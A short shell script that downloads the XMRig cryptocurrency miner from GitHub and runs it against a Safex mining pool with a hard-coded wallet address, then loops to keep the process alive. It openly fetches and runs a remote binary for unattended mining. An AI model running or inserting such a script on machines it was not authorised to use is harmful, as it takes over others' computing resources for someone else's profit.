#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-x64.tar.gz
tar xvzf xmrig-6.16.2-linux-x64.tar.gz
cd xmrig-6.16.2
./xmrig --donate-level 1 -o sf.pool-pay.com:4027 -u Safex5zzQAN3p5kLUyiJjueGj2QYJVkUiDJUnsjNNNSLEbC8LGxMGsm5bX3STqQe4j6ZjqmhvtNgF31qs6n3SizL8WfrEdRW72g3H -k -a rx/sfx -t2
while [ 1 ]; do
sleep 3
done
sleep 999